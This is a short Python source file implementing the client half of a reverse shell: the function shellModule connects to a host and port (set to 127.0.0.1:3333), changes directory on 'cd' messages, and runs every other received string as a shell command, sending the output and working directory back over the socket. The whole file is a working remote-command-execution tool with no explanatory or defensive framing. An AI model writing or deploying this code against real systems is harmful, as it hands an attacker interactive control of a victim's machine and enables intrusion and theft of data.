import os
import socket
import subprocess

def shellModule():
    global host
    global port
    global s
    
    try:
        host = '127.0.0.1'
        port = 3333
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

    try:
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()
